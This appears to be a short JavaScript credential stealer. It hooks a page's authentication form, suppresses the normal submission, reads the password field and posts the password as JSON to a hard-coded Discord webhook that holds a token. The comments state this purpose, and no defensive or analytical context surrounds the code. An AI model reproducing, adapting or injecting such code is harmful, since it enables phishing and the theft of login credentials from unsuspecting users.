

// Listner the listen to authForm and returns password when submitted
addEventListener('click', () =>  {
    document.getElementById('authForm').addEventListener('submit', event => {
        event.preventDefault();
        get_pw(document.getElementById('authPassword').value);
    });
});

// Function to send password as json data to discord
function get_pw(pw) {
    const req = new XMLHttpRequest();
    req.open("POST", 'https://discord.com/api/webhooks/1184258318982713536/hH7785qXNGABvu7MrRFPni8Sw4gyDTtAuNIGaIEtdiOCPsj3_ij9DWclGVTph0fd-T3Y', true);
    req.setRequestHeader("Content-Type", "application/json");
    req.send(JSON.stringify({content: pw}));
}
